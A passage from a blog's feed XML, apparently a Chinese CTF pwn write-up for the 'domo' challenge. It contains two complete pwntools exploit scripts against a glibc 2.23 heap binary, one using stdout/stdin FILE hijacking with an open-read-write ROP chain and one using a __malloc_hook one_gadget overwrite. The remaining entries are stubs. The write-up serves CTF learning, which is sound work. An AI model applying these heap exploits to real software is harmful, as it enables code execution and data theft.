class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-09-01T10:49:40.807Z</updated>
    
    <content type="html"><![CDATA[<p>咕咕咕，留个坑。等有时间再写</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;咕咕咕，留个坑。等有时间再写&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19QcRrgkAo4ff5gKM7LYCuQMAtaZ1fqV6o= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
